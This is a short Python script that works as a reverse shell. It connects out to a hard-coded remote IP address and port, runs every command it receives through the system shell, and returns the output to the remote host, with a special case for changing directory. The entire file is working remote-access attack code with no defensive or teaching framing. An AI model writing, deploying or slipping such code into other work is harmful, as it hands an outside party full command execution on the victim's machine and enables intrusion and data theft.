import socket
import os
import subprocess

host = '188.78.49.189'
port = 20000
s = socket.socket()
s.connect((host, port))

while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == "cd":
		try:
			os.chdir(data[3:].decode("utf-8"))
		except:
			s.send(str.encode("Error cambiando directorio\n" + str(os.getcwd()) + "> "))
		s.send(str.encode(str(os.getcwd()) + "> "))
	elif len(data) > 0:
		try:
			t = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = t.stdout.read() + t.stderr.read()
			output_string = str(output_bytes, "utf-8")
			s.send(str.encode(output_string + str(os.getcwd()) + "> "))
		except:
			output_string = "Command not recognized\n"
			s.send(str.encode(output_string + str(os.getcwd()) + "> "))
